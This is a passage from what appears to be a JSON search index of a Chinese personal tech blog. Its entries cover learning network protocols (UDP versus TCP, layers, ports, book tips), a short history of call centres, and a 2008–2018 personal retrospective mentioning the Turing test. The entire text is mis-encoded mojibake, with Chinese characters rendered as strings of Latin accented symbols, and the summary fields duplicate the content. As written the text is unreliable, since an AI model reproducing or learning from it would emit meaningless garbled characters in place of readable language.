ä½†å°±æ˜¯è°éƒ½æ›¿ä»£ä¸äº†ï¼Œudpæ²¡æœ‰tcpé‚£äº›å¤æ‚çš„æ ¡éªŒå’Œé‡ä¼ ç­‰å¤æ‚çš„æ­¥éª¤ï¼Œæ‰€ä»¥å®ƒå‘é€æ¶ˆæ¯éå¸¸å¿«ï¼Œè€Œä¸”å¹¶ä¸ä¿è¯å¯¹æ–¹ä¸€å®šæ”¶åˆ°ã€‚å¦‚æœå¯¹æ–¹æ”¶ä¸åˆ°æ¶ˆæ¯ï¼Œé‚£ä¹ˆudpå°±ä¼šå‘†èŒçš„çœ‹ç€ä½ ï¼Œç¬‘ç€å¯¹ä½ è¯´ï¼šæˆ‘å·²ç»å°½åŠ›äº†ã€‚ä¸€èˆ¬è¯­éŸ³è€Œè§†é¢‘æ•°æ®éƒ½æ˜¯ç”¨udpåè®®ä¼ è¾“çš„ï¼Œå› ä¸ºéŸ³é¢‘æˆ–è€…è§†é¢‘å¡äº†ä¸€ä¸‹å¹¶ä¸å½±å“æ•´ä½“çš„è´¨é‡ï¼Œè€Œå¯¹å®æ—¶æ€§çš„è¦æ±‚ä¼šæ›´é«˜ã€‚\n1.2. è¿è¾“å±‚å’Œç½‘ç»œå±‚çš„åŒºåˆ« è¿è¾“å±‚å…³æ³¨çš„æ˜¯ç«¯åˆ°ç«¯å±‚é¢ï¼ŒåŠEnd1åˆ°End2ï¼Œå¿½ç•¥ä¸­é—´çš„ä»»ä½•ç‚¹ã€‚ ç½‘ç»œå±‚å…³æ³¨ä¸¤ç‚¹ä¹‹é—´çš„å±‚é¢ï¼Œå³hop1å¦‚ä½•åˆ°hop2ï¼Œhop2å¦‚ä½•åˆ°hop3 ç½‘ç»œå±‚å¹¶ä¸ä¿è¯æ¶ˆæ¯å¯é æ€§ï¼Œå¯é æ€§ä¸Šå±‚çš„ä¼ è¾“å±‚è´Ÿè´£ã€‚TCPé‡‡ç”¨è¶…æ—¶é‡ä¼ ï¼Œåˆ†ç»„ç¡®è®¤çš„æœºåˆ¶ï¼Œä¿è¯æ¶ˆæ¯ä¸ä¼šä¸¢å¤±ã€‚ ä»ä¸‹å›¾tcp, udp, ipåè®®ä¸­ï¼Œå¯ä»¥å‘ç°\nä¼ è¾“å±‚çš„tcpå’Œudpéƒ½æ˜¯æœ‰æºç«¯å£å’Œç›®çš„ç«¯å£ï¼Œä½†æ˜¯æ²¡æœ‰ipå­—æ®µ æºipå’Œç›®çš„ipåªåœ¨ipæ•°æ®æŠ¥ä¸­ ç†è§£å„ä¸ªåè®®ï¼Œå…³é”®åœ¨äºç†è§£æŠ¥æ–‡çš„å„ä¸ªå­—æ®µçš„å«ä¹‰ 1.3. ipå’Œç«¯å£å·çš„çœŸæ­£å«ä¹‰ ä¸Šä¸ªç« èŠ‚è®²åˆ°è¿è¾“å±‚å’Œç½‘ç»œå±‚çš„åŒºåˆ«ï¼Œå…¶ä¸­ç«¯å£å·è¢«å°è£…åœ¨è¿è¾“å±‚ï¼Œipè¢«å°è£…åˆ°ç½‘ç»œæˆï¼Œ\né‚£ä¹ˆç«¯å£å·å’Œipåœ°å€åˆ°åº•æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ\nipç”¨æ¥ç”¨æ¥æ ‡è®°ä¸»æœºçš„ä½ç½® ç«¯å£å·ç”¨æ¥æ ‡è®°è¯¥æ•°æ®åº”è¯¥è¢«ç›®æ ‡ä¸»æœºä¸Šçš„å“ªä¸ªåº”ç”¨ç¨‹åºå»å¤„ç† 1.4. æ•°æ®åœ¨åè®®æ ˆçš„æµåŠ¨ å°è£…ä¸åˆ†ç”¨ å½“å‘é€æ¶ˆæ¯æ—¶ï¼Œæ•°æ®åœ¨å‘ä¸‹ä¼ é€’æ—¶ï¼Œç»è¿‡ä¸åŒå±‚æ¬¡çš„åè®®å¤„ç†ï¼Œæ‰“ä¸Šå„ç§å¤´éƒ¨ä¿¡æ¯ å½“æ¥å—æ¶ˆæ¯æ—¶ï¼Œæ•°æ®åœ¨å‘ä¸Šä¼ é€’ï¼Œé€šè¿‡ä¸åŒçš„å¤´éƒ¨ä¿¡æ¯å­—æ®µï¼Œæ‰çŸ¥é“è¦äº¤ç»™ä¸Šå±‚çš„é‚£ä¸ªæ¨¡å—æ¥å¤„ç†ã€‚æ¯”å¦‚ä¸€ä¸ªipåŒ…ï¼Œå¦‚æœæ²¡æœ‰å¤´éƒ¨ä¿¡æ¯ï¼Œé‚£ä¹ˆè¿™ä¸ªæ¶ˆæ¯ç©¶ç«Ÿæ˜¯äº¤ç»™tcpåè®®æ¥å¤„ç†ï¼Œè¿˜æ˜¯udpæ¥å¤„ç†ï¼Œå°±ä¸å¾—è€ŒçŸ¥äº† 2. æ·±å…¥é˜…è¯»ï¼Œå¥½ä¹¦æ¨è ã€Šhttpæƒå¨æŒ‡å—ã€‹ æœ‰äººè¯´è¿™æœ¬ä¹¦å¤ªåšï¼Œå·å·å‘Šè¯‰ä½ ï¼Œå…¶å®è¿™æœ¬ä¹¦å¹¶åšï¼Œå› ä¸ºè¿™æœ¬ä¹¦çš„åé¢çš„30%éƒ¨åˆ†éƒ½æ˜¯é™„å½•ï¼Œè¿™æœ¬ä¹¦çš„ç²¾åæ˜¯å‰50%çš„éƒ¨åˆ† ã€Šå›¾è§£httpã€‹ã€ã€Šå›¾è§£tcp/ipã€‹è¿™ä¸¤æœ¬å›¾è§£çš„ä¹¦ï¼ŒçŸ¥è¯†ç‚¹è®²çš„éƒ½æ˜¯æ¯”è¾ƒé€šä¿—æ˜“æ‡‚çš„ï¼Œé€‚åˆå…¥é—¨ ã€Štcp/ip è¯¦è§£ å·1ã€‹è¿™æœ¬ä¹¦ï¼Œè®©ä½ çŸ¥å…¶ç„¶ï¼Œæ›´çŸ¥å…¶æ‰€ä»¥ç„¶ ã€Štcp/ip åŸºç¡€ã€‹ã€ã€Štcp/ip è·¯ç”±æŠ€æœ¯ã€‹è¿™ä¸¤æœ¬ä¹¦ï¼Œä¼šè®©ä½ ä»ä¸åŒè§’åº¦æ€è€ƒåè®® ã€Šç²¾é€šwiresharkã€‹ã€ã€Šwiresharkç½‘ç»œåˆ†æå®æˆ˜ã€‹å¦‚æœä½ çœ‹äº†å¾ˆå¤šä¹¦ï¼Œå´ä»æ¥æ²¡æœ‰è¯•è¿‡ç½‘ç»œæŠ“åŒ…ï¼Œé‚£ä½ åªæ˜¯æ‡‚çº¸ä¸Šè°ˆå…µç½¢äº†ã€‚ä½ æ°¸è¿œæ— æ³•ç†è§£tcpä¸‰æ¬¡æ¡æ‰‹çš„æ€¦ç„¶å¿ƒåŠ¨ï¼Œä¸å››æ¬¡åˆ†æ‰‹çš„åˆ»éª¨é“­å¿ƒã€‚ ","title":"å¦‚ä½•å­¦ä¹ ç½‘ç»œåè®®ï¼Ÿ"},{"content":"ä»€ä¹ˆæ˜¯å‘¼å«ä¸­å¿ƒï¼Ÿ å‘¼å«ä¸­å¿ƒåˆç§°ä¸ºå®¢æˆ·æœåŠ¡ä¸­å¿ƒã€‚æœ‰ä»¥ä¸‹å…³é”®è¯\nCTI é€šä¿¡ç½‘ç»œ è®¡ç®—æœº ä¼ä¸šçº§ é«˜è´¨é‡ã€é«˜æ•ˆç‡ã€å…¨æ–¹ä½ã€ç»¼åˆä¿¡æ¯æœåŠ¡ å‘¼å«ä¸­å¿ƒå†å² 1956å¹´ç¾å›½æ³›ç¾èˆªç©ºå…¬å¸å»ºæˆä¸–ç•Œç¬¬ä¸€å®¶å‘¼å«ä¸­å¿ƒã€‚\né˜¶æ®µ è¡Œä¸šèŒƒå›´ æŠ€æœ¯ åŠŸèƒ½ä¸æ„ä¹‰ ç¬¬ä¸€ä»£å‘¼å«ä¸­å¿ƒ æ°‘èˆª PBXã€ç”µè¯æ’é˜Ÿ ä¸»è¦æœåŠ¡ç”±äººå·¥å®Œæˆ ç¬¬äºŒä»£å‘¼å«ä¸­å¿ƒ é“¶è¡Œã€ç”Ÿæ´» IVR(äº¤äº’å¼è¯­éŸ³åº”ç­”)ã€DTMF æ˜¾è‘—æé«˜å·¥ä½œæ•ˆç‡ï¼Œæä¾›å…¨å¤©å€™æœåŠ¡ ç¬¬ä¸‰ä»£å‘¼å«ä¸­å¿ƒ CTI(ç”µè„‘è®¡ç®—æœºé›†æˆ) è¯­éŸ³æ•°æ®åŒæ­¥ï¼Œå®¢æˆ·ä¿¡æ¯å­˜å‚¨ä¸æŸ¥é˜…ï¼Œä¸ªæ€§åŒ–æœåŠ¡ï¼Œè‡ªåŠ¨åŒ– ç¬¬å››ä»£å‘¼å«ä¸­å¿ƒ æ¥å…¥ç”µå­é‚®ä»¶ã€äº’è”ç½‘ã€æ‰‹æœºçŸ­ä¿¡ç­‰ å¤šæ¸ é“æ¥å…¥ã€å¤šæ¸ é“ç»Ÿä¸€æ’é˜Ÿ ç¬¬äº”ä»£å‘¼å«ä¸­å¿ƒ æ¥å…¥ç¤¾äº¤ç½‘ç»œã€ç¤¾äº¤åª’ä½“(å¾®åšã€å¾®ä¿¡ç­‰) æ–‡æœ¬äº¤è°ˆï¼ŒéŸ³é¢‘è§†é¢‘æ²Ÿé€š å‘¼å«ä¸­å¿ƒåˆ†ç±» æŒ‰å‘¼å«æ–¹å¼åˆ†ç±» å¤–å‘¼å‹å‘¼å«ä¸­å¿ƒï¼ˆå¦‚ç”µè¯è¥é”€ï¼‰ å®¢æœå‹å‘¼å«ä¸­å¿ƒï¼ˆå¦‚å®¢æˆ·æœåŠ¡ï¼‰ æ··åˆå‹å‘¼å«ä¸­å¿ƒ ï¼ˆå¦‚è¥é”€å’Œå®¢æœï¼‰ æŒ‰æŠ€æœ¯æ¶æ„åˆ†ç±» äº¤æ¢æœº æ¿å¡ è½¯äº¤æ¢ï¼ˆIPCCï¼‰ ã€äº¤æ¢æœºç±»å‹å‘¼å«ä¸­å¿ƒã€‘\n","permalink":"https://wdd.js.org/posts/2019/01/call-center-brief-history/","summary":"ä»€ä¹ˆæ˜¯å‘¼å«ä¸­å¿ƒï¼Ÿ å‘¼å«ä¸­å¿ƒåˆç§°ä¸ºå®¢æˆ·æœåŠ¡ä¸­å¿ƒã€‚æœ‰ä»¥ä¸‹å…³é”®è¯\nCTI é€šä¿¡ç½‘ç»œ è®¡ç®—æœº ä¼ä¸šçº§ é«˜è´¨é‡ã€é«˜æ•ˆç‡ã€å…¨æ–¹ä½ã€ç»¼åˆä¿¡æ¯æœåŠ¡ å‘¼å«ä¸­å¿ƒå†å² 1956å¹´ç¾å›½æ³›ç¾èˆªç©ºå…¬å¸å»ºæˆä¸–ç•Œç¬¬ä¸€å®¶å‘¼å«ä¸­å¿ƒã€‚\né˜¶æ®µ è¡Œä¸šèŒƒå›´ æŠ€æœ¯ åŠŸèƒ½ä¸æ„ä¹‰ ç¬¬ä¸€ä»£å‘¼å«ä¸­å¿ƒ æ°‘èˆª PBXã€ç”µè¯æ’é˜Ÿ ä¸»è¦æœåŠ¡ç”±äººå·¥å®Œæˆ ç¬¬äºŒä»£å‘¼å«ä¸­å¿ƒ é“¶è¡Œã€ç”Ÿæ´» IVR(äº¤äº’å¼è¯­éŸ³åº”ç­”)ã€DTMF æ˜¾è‘—æé«˜å·¥ä½œæ•ˆç‡ï¼Œæä¾›å…¨å¤©å€™æœåŠ¡ ç¬¬ä¸‰ä»£å‘¼å«ä¸­å¿ƒ CTI(ç”µè„‘è®¡ç®—æœºé›†æˆ) è¯­éŸ³æ•°æ®åŒæ­¥ï¼Œå®¢æˆ·ä¿¡æ¯å­˜å‚¨ä¸æŸ¥é˜…ï¼Œä¸ªæ€§åŒ–æœåŠ¡ï¼Œè‡ªåŠ¨åŒ– ç¬¬å››ä»£å‘¼å«ä¸­å¿ƒ æ¥å…¥ç”µå­é‚®ä»¶ã€äº’è”ç½‘ã€æ‰‹æœºçŸ­ä¿¡ç­‰ å¤šæ¸ é“æ¥å…¥ã€å¤šæ¸ é“ç»Ÿä¸€æ’é˜Ÿ ç¬¬äº”ä»£å‘¼å«ä¸­å¿ƒ æ¥å…¥ç¤¾äº¤ç½‘ç»œã€ç¤¾äº¤åª’ä½“(å¾®åšã€å¾®ä¿¡ç­‰) æ–‡æœ¬äº¤è°ˆï¼ŒéŸ³é¢‘è§†é¢‘æ²Ÿé€š å‘¼å«ä¸­å¿ƒåˆ†ç±» æŒ‰å‘¼å«æ–¹å¼åˆ†ç±» å¤–å‘¼å‹å‘¼å«ä¸­å¿ƒï¼ˆå¦‚ç”µè¯è¥é”€ï¼‰ å®¢æœå‹å‘¼å«ä¸­å¿ƒï¼ˆå¦‚å®¢æˆ·æœåŠ¡ï¼‰ æ··åˆå‹å‘¼å«ä¸­å¿ƒ ï¼ˆå¦‚è¥é”€å’Œå®¢æœï¼‰ æŒ‰æŠ€æœ¯æ¶æ„åˆ†ç±» äº¤æ¢æœº æ¿å¡ è½¯äº¤æ¢ï¼ˆIPCCï¼‰ ã€äº¤æ¢æœºç±»å‹å‘¼å«ä¸­å¿ƒã€‘","title":"å‘¼å«ä¸­å¿ƒç®€å²"},{"content":"2008-2018 åå¹´ï¼Œå¾€äº‹å¦‚æ˜¨ 2018å¹´å·²ç»æ˜¯æ˜¨å¤©ï¼Œä»Šå¤©æ˜¯2019çš„ç¬¬ä¸€å¤©ã€‚\n2008å¹´å·²ç»æ˜¯10å¹´å‰ï¼Œ10å¹´å‰çš„å‚æ™šï¼Œæˆ‘èµ°åœ¨å—äº¬ä»™æ—çš„ä¸€ä¸ªå¤§è¡—ä¸Šï¼Œæç€ä¸€ç“¶çŸ¿æ³‰æ°´ï¼Œæ“¦ç€é¢å¤´çš„æ±—æ°´ï¼Œä»°å¤´çœ‹ç€å¤§å±å¹•ä¸Šæ’­æ”¾ç€åŒ—äº¬å¥¥è¿ä¼šçš„å¼€å¹•å¼ã€‚\n10å¹´å‰çš„å¤å¤©ï¼Œæˆ‘å¸¦ç€ä¸€æ­¥è¯ºåŸºäºšæ‰‹æœºåŠŸèƒ½æœºï¼Œç‹¬è‡ªä¸€äººå»äº†å—äº¬ã€‚\nåè¿‡ç»£çƒå…¬å›­çš„çŸ³å‡³ï¼Œç©¿è¿‡å¤©å¦ƒå®«çš„å›å»Šï¼Œå¹è¿‡é˜…æ±Ÿæ¥¼çš„å‡‰çˆ½çš„æ±Ÿé£ï¼Œè¸ç€å¤è€æ–‘é©³çš„åŸå¢™ï¼Œåœ¨æ—è«å°è·¯çš„é•¿æ¤…ä¸Šï¼Œæˆ‘æƒ³ç€10å¹´åæˆ‘ä¼šåœ¨å“ªé‡Œï¼Ÿåšç€ä»€ä¹ˆäº‹æƒ…ï¼Ÿ\nå¾€äº‹å¦‚æ˜¨ï¼Œè€Œä»Šå°†è¿‘è€Œç«‹ï¼Œä½†æ˜¯ä¾ç„¶è§‰å¾—è‡ªå·±è¿˜æ˜¯10å¹´çš„é‚£ä¸ªç‹¬è‡ªå‡ºå»ç©çš„å°ç”·å­©ã€‚\n2018 è¯»äº†10å¹´éƒ½æ²¡æœ‰è¯»å®Œçš„ä¹¦ï¼Œäº”å‘³æ‚é™ˆ 2018å¹´ï¼Œåœ¨æˆ‘åšæ‰‹æœ¯å‰ï¼Œæˆ‘è§‰å¾—è‡ªå·±å‡ºäº†å·¥ä½œçš„æ—¶é—´å¤–ï¼Œå¤§å¤šæ•°æ—¶é—´éƒ½åœ¨çœ‹ä¹¦ã€‚2018å¹´è¿™ä¸€å¹´çœ‹çš„ä¹¦ï¼Œè¦æ¯”2008åˆ°2018å¹´è¿™åå¹´é—´çš„çœ‹çš„ä¹¦éƒ½è¦å¤šã€‚è¿™éƒ½å½’åŠŸäºæˆ‘å¯¹æ¯å¤©çš„çœ‹ä¹¦éƒ½æœ‰å®šé‡çš„è®¡åˆ’ï¼Œä¸€æ—¦æŒ‰ç…§è¿™ä¸ªè®¡åˆ’å®è¡Œå‡ ä¸ªæœˆï¼Œç§¯ç´¯çš„æ•ˆæœè¿˜æ˜¯éå¸¸æ˜æ˜¾çš„ã€‚\n2018å¹´ï¼Œæ‰‹æœºå‡ ä¹æˆä¸ºäººçš„å››è‚¢ä¹‹å¤–çš„ç¬¬äº”è‚¢ã€‚å¯¹å¤§å¤šäººæ¥è¯´ï¼Œä¸Šå•æ‰€å¯ä»¥ä¸å¸¦çº¸ï¼Œä½†æ˜¯ä¸èƒ½ä¸å¸¦æ‰‹æœºã€‚\nå„ç§APP, éƒ½åœ¨æåŠ›çš„å¸å¼•ç”¨æˆ·å¤šèŠ±ç‚¹æ—¶é—´åœ¨è‡ªå·±èº«ä¸Š ä¿¡æ¯æµå……æ–¥ç€å„ç§æ¯«æ— è¥å…»ï¼Œä¸“é—¨å¸äººçœ¼çƒçš„åƒåœ¾æ–°é—»ï¼Œä½†æ˜¯è¿™ç§æ–°é—»çš„é˜…è¯»é‡è¿˜æ˜¯è›®å¤§çš„ å„ç§å€Ÿé’±ï¼Œä¿¡ç”¨å¡ï¼ŒèŠ±å‘—ç­‰éƒ½åƒé’æ¥¼çš„å°å§ï¼Œå¦©åªšçš„ç¬‘å®¹ï¼Œè¯´é“ï¼šå®˜äººï¼Œè¿›æ¥åšä¸€åš å…±äº«å•è½¦ï¼Œåœ¨ä»Šå¹´é€€æ½®ä¹‹åï¼Œæ‰å‘ç°è‡ªå·±éƒ½åœ¨è£¸æ³³ æ¯”ç‰¹å¸ï¼ŒæŒ–çŸ¿æœºã€‚ä¸çŸ¥é“è°å‰²äº†è°çš„éŸ­èœï¼Œæ€»å¸Œæœ›æœ‰ä¸‹ä¸€ä¸ªå‚»å­æ¥æ¥ç›˜ï¼Œæœ€åå‘ç°è‡ªå·±å¯èƒ½å°±æ˜¯æœ€åä¸€ä¸ªå‚»å­ AIï¼Œäººå·¥æ™ºèƒ½å¾ˆç«ï¼Œæ”¾ä½›å°±å¿«è¦è¿›å…¥ç»ˆç»“è€…é‚£æ ·çš„ä¸–ç•Œ é”¤å­å®äº†ï¼Œæ›¾ç»å¹è¿‡çš„ç‰›é€¼ï¼Œæ›¾ç»ç†æƒ³ä¸»ä¹‰ç»ˆäºè„±å»é‚£åˆé»‘åˆäº®çš„é¢å…· å›¾çµæµ‹è¯•ï¼ˆThe Turing testï¼‰ç”±è‰¾ä¼¦Â·éº¦å¸­æ£®Â·å›¾çµå‘æ˜ï¼ŒæŒ‡æµ‹è¯•è€…ä¸è¢«æµ‹è¯•è€…ï¼ˆä¸€ä¸ªäººå’Œä¸€å°æœºå™¨ï¼‰éš”å¼€çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ä¸€äº›è£…ç½®ï¼ˆå¦‚é”®ç›˜ï¼‰å‘è¢«æµ‹è¯•è€…éšæ„æé—®ã€‚ è¿›è¡Œå¤šæ¬¡æµ‹è¯•åï¼Œå¦‚æœæœ‰è¶…è¿‡30%çš„æµ‹è¯•è€…ä¸èƒ½ç¡®å®šå‡ºè¢«æµ‹è¯•è€…æ˜¯äººè¿˜æ˜¯æœºå™¨ï¼Œé‚£ä¹ˆè¿™å°æœºå™¨å°±é€šè¿‡äº†æµ‹è¯•ï¼Œå¹¶è¢«è®¤ä¸ºå…·æœ‰äººç±»æ™ºèƒ½ã€‚å›¾çµæµ‹è¯•ä¸€è¯æ¥æºäºè®¡ç®—æœºç§‘å­¦å’Œå¯†ç å­¦çš„å…ˆé©±é˜¿å…°Â·éº¦å¸­æ£®Â·å›¾çµå†™äº1950å¹´çš„ä¸€ç¯‡è®ºæ–‡ã€Šè®¡ç®—æœºå™¨ä¸æ™ºèƒ½ã€‹ï¼Œå…¶ä¸­30%æ˜¯å›¾çµå¯¹2000å¹´æ—¶çš„æœºå™¨æ€è€ƒèƒ½åŠ›çš„ä¸€ä¸ªé¢„æµ‹ï¼Œç›®å‰æˆ‘ä»¬å·²è¿œè¿œè½åäºè¿™ä¸ªé¢„æµ‹ã€‚\næœ€åè¯´ä¸€ä¸‹å›¾çµæµ‹è¯•ï¼Œåœ¨AIæ–¹é¢ï¼Œè¿™ä¸ªæµ‹è¯•æ— äººä¸çŸ¥ã€‚ä¸€ä¸ªæœºå™¨å¦‚æœé€šè¿‡äº†å›¾çµæµ‹è¯•ï¼Œåˆ™è¯´æ˜è¯¥æœºå™¨å…·æœ‰äº†åªèƒ½ã€‚ä½†æ˜¯ä¸‰ä½“çš„ä½œè€…å¤§åˆ˜æ›¾ç»è¯´è¿‡ä¸€å¥è¯ï¼Œç»™æˆ‘ä¸€ç§é†é†çŒé¡¶çš„æ„Ÿè§‰ï¼Œå‡å¦‚ä¸€ä¸ªæœºå™¨äººæœ‰èƒ½åŠ›é€šè¿‡å›¾çµæµ‹è¯•ï¼Œå´å‡è£…æ— æ³•é€šè¿‡ï¼Œä½ è¯´è¿™ä¸ªæœºå™¨æ˜¯å¦å…·æœ‰äººå·¥æ™ºèƒ½ã€‚æ‰€ä»¥å¤§åˆ˜çš„è¿™ç§è¯´æ³•æ‰æ›´åŠ è®©äººææƒ§ã€‚æœºå™¨äººèƒ½é€šè¿‡å›¾çµæµ‹è¯•ï¼Œåªè¯´æ˜è¿™ä¸ªæœºå™¨äººå…·æœ‰äº†æ™ºèƒ½ã€‚ä½†æ˜¯ç°é˜¶æ®µçš„æ™ºèƒ½åªä¸è¿‡æ˜¯æ¡ä»¶åå°„ï¼Œæˆ–è€…æ˜¯åŸºäºæ¦‚ç‡è®¡ç®—çš„ç»“æœã€‚åè€…è¿™ç§èƒ½é€šè¯æµ‹è¯•ï¼Œå´å‡è£…æ— æ³•é€šè¿‡çš„æ™ºèƒ½ã€‚è¿™ä¸ä»…ä»…æ˜¯æ™ºèƒ½ï¼Œè€Œæ˜¯æœºå™¨çš„åŸåºœã€‚\næœ‰æ™ºèƒ½çš„æœºå™¨å¹¶ä¸å¯æ€•ï¼Œæœ‰åŸåºœçš„æœºå™¨äººæ‰æ˜¯çœŸæ­£çš„å¯æ€•ã€‚\nå¦‚æœæ¢¦ä¸­æ›´åŠ å¹¸ç¦å¿«ä¹ï¼Œä¸ºä»€ä¹ˆè¦å›åˆ°ç°å® ç«å½±çš„æœ€åï¼Œå¤§ç­’æœ¨è¾‰å¤œä½¿ç”¨æ— é™æœˆè¯»å°†ä¸–ç•Œä¸Šçš„æ‰€æœ‰äººéƒ½å¸¦å…¥æ¢¦å¢ƒï¼Œæ¯ä¸ªäººçš„æŸ¥å…‹æ‹‰éƒ½è¢«å¸å–ï¼Œå¹¶ä½œä¸ºç¥æ ‘çš„å…»æ–™ã€‚\nå¦‚æœçœŸçš„å­˜åœ¨å¤§ç­’æœ¨è¿™æ ·çš„ä¸Šå¸ï¼Œé‚£ä¹ˆæ—¶é—´å°±æ˜¯æŸ¥å…‹æ‹‰ã€‚äººç±»å”¯ä¸€çœŸæ­£æ‹¥æœ‰è¿‡çš„ä¸œè¥¿ï¼Œæ—¶é—´ï¼Œå°†ä½œä¸ºç¥æ ‘çš„å…»æ–™ï¼Œä»æ¯ä¸ªäººèº«ä¸Šæå–ã€‚\nå„ç§å…·æœ‰å¸å¼•åŠ›çš„æœ¯ï¼Œå…¶å®å¯ä»¥ç†è§£ä¸ºæ— é™æœˆè¯»ï¼Œè®©äººæ²‰é†‰äºæ¢¦å¹»ä¸­ã€‚\nå¦‚æœæ¢¦ä¸­æ›´åŠ å¹¸ç¦å¿«ä¹ï¼Œä¸ºä»€ä¹ˆè¦å›åˆ°ç°å®ä¸­æ‰¿å—å‹åŠ›ä¸æ‚²å“€å‘¢ï¼Ÿ ç›®å‰æˆ‘æ— æ³•å›å¤è‡ªå·±çš„è¿™ä¸ªé—®é¢˜ï¼ŒæœŸå¾…2019å¹´æˆ‘å¯ä»¥å¾—åˆ°è¿™ä¸ªç­”æ¡ˆã€‚\nå·¥ä½œæ–¹é¢ 2019å¹´ï¼Œæˆ‘ä¼šåœ¨åšä¸€äº›åç«¯æ–¹é¢çš„å·¥ä½œï¼ŒåŠªåŠ›åŠ æ²¹å§ã€‚\n","permalink":"https://wdd.js.org/posts/2018/01/where-time-you-spend-what-you-will-be/","summary":"2008-2018 åå¹´ï¼Œå¾€äº‹å¦‚æ˜¨ 2018å¹´å·²ç»æ˜¯æ˜¨å¤©ï¼Œä»Šå¤©æ˜¯2019çš„ç¬¬ä¸€å¤©ã€‚\n2008å¹´å·²ç»æ˜¯10å¹´å‰ï¼Œ10å¹´å‰çš„å‚æ™šï¼Œæˆ‘èµ°åœ¨å—äº¬ä»™æ—çš„ä¸€ä¸ªå¤§è¡—ä¸Šï¼Œæç€ä¸€ç“¶çŸ¿æ³‰æ°´ï¼Œæ“¦ç€é¢å¤´çš„æ±—æ°´ï¼Œä»°å¤´çœ‹ç€å¤§å±å¹•ä¸Šæ’­æ”¾ç€åŒ—äº¬å¥¥è¿ä¼šçš„å¼€å¹•å¼ã€‚\n10å¹´å‰çš„å¤å¤©ï¼Œæˆ‘å¸¦ç€ä¸€æ­¥è¯ºåŸºäºšæ‰‹æœºåŠŸèƒ½æœºï¼Œç‹¬è‡ªä¸€äººå»äº†å—äº¬ã€‚\nåè¿‡ç»£çƒå…¬å›­çš„çŸ³å‡³ï¼Œç©¿è¿‡å¤©å¦ƒå®«çš„å›å»Šï¼Œå¹è¿‡é˜…æ±Ÿæ¥¼çš„å‡‰çˆ½çš„æ±Ÿé£ï¼Œè¸ç€å¤è€æ–‘é©³çš„åŸå¢™ï¼Œåœ¨æ—è«å°è·¯çš„é•¿æ¤…ä¸Šï¼Œæˆ‘æƒ³ç€10å¹´åæˆ‘ä¼šåœ¨å“ªé‡Œï¼Ÿåšç€ä»€ä¹ˆäº‹æƒ…ï¼Ÿ\nå¾€äº‹å¦‚æ˜¨ï¼Œè€Œä»Šå°†è¿‘è€Œç«‹ï¼Œä½†æ˜¯ä¾ç„¶è§‰å¾—è‡ªå·±è¿˜æ˜¯10å¹´çš„é‚£ä¸ªç‹¬è‡ªå‡ºå»ç©çš„å°ç”·å­©ã€‚\n2018 è¯»äº†10å¹´éƒ½æ²¡æœ‰è¯»å®Œçš„ä¹¦ï¼Œäº”å‘³æ‚é™ˆ 2018å¹´ï¼Œåœ¨æˆ‘åšæ‰‹æœ¯å‰ï¼Œæˆ‘è§‰å¾—è‡ªå·±å‡ºäº†å·¥ä½œçš„æ—¶é—´å¤–ï¼Œå¤§å¤šæ•°æ—¶é—´éƒ½åœ¨çœ‹ä¹¦ã€‚2018å¹´è¿™ä¸€å¹´çœ‹çš„ä¹¦ï¼Œè¦æ¯”2008åˆ°2018å¹´è¿™åå¹´é—´çš„çœ‹çš„ä¹¦éƒ½è¦å¤šã€‚è¿™éƒ½å½’åŠŸäºæˆ‘å¯¹æ¯å¤©çš„çœ‹ä¹¦éƒ½æœ‰å®šé‡çš„è®¡åˆ’ï¼Œä¸€æ—¦æŒ‰ç…§è¿™ä¸ªè®¡åˆ’å®è¡Œå‡ ä¸ªæœˆï¼Œç§¯ç´¯çš„æ•ˆæœè¿˜æ˜¯éå¸¸æ˜æ˜¾çš„ã€‚\n2018å¹´ï¼Œæ‰‹æœºå‡ ä¹æˆä¸ºäººçš„å››è‚¢ä¹‹å¤–çš„ç¬¬äº”è‚¢ã€‚å¯¹å¤§å¤šäººæ¥è¯´ï¼Œä¸Šå•æ‰€å¯ä»¥ä¸å¸¦çº¸ï¼Œä½†æ˜¯ä¸èƒ½ä¸å¸¦æ‰‹æœºã€‚\nå„ç§APP, éƒ½åœ¨æåŠ›çš„å¸å¼•ç”¨æˆ·å¤šèŠ±ç‚¹æ—¶é—´åœ¨è‡ªå·±èº«ä¸Š ä¿¡æ¯æµå……æ–¥ç€å„ç§æ¯«æ— è¥å…»ï¼Œä¸“é—¨å¸äººçœ¼çƒçš„åƒåœ¾æ–°é—»ï¼Œä½†æ˜¯è¿™ç§æ–°é—»çš„é˜…è¯»é‡è¿˜æ˜¯è›®å¤§çš„ å„ç§å€Ÿé’±ï¼Œä¿¡ç”¨å¡ï¼ŒèŠ±å‘—ç­‰éƒ½åƒé’æ¥¼çš„å°å§ï¼Œå¦©åªšçš„ç¬‘å®¹ï¼Œè¯´é“ï¼šå®˜äººï¼Œè¿›æ¥åšä¸€åš å…±äº«å•è½¦ï¼Œåœ¨ä»Šå¹´é€€æ½®ä¹‹åï¼Œæ‰å‘ç°è‡ªå·±éƒ½åœ¨è£¸æ³³ æ¯”ç‰¹å¸ï¼ŒæŒ–çŸ¿æœºã€‚ä¸çŸ¥é“è°å‰²äº†è°çš„éŸ­èœï¼Œæ€»å¸Œæœ›æœ‰ä¸‹ä¸€ä¸ªå‚»å­æ¥æ¥ç›˜ï¼Œæœ€åå‘ç°è‡ªå·±å¯èƒ½å°±æ˜¯æœ€åä¸€ä¸ªå‚»å­ AIï¼Œäººå·¥æ™ºèƒ½å¾ˆç«ï¼Œæ”¾ä½›å°±å¿«è¦è¿›å…¥ç»ˆç»“è€…é‚£æ ·çš„ä¸–ç•Œ é”¤å­å®äº†ï¼Œæ›¾ç»å¹è¿‡çš„ç‰›é€¼ï¼Œæ›¾ç»ç†æƒ³ä¸»ä¹‰ç»ˆäºè„±å»é‚£åˆé»‘åˆäº®çš„é¢å…· å›¾çµæµ‹è¯•ï¼ˆThe Turing testï¼‰ç”±è‰¾ä¼¦Â·éº¦å¸­æ£®Â·å›¾çµå‘æ˜ï¼ŒæŒ‡æµ‹è¯•è€…ä¸è¢«æµ‹è¯•è€…ï¼ˆä¸€ä¸ªäººå’Œä¸€å°æœºå™¨ï¼‰éš”å¼€çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ä¸€äº›è£…ç½®ï¼ˆå¦‚é”®ç›˜ï¼‰å‘è¢«æµ‹è¯•è€…éšæ„æé—®ã€‚ 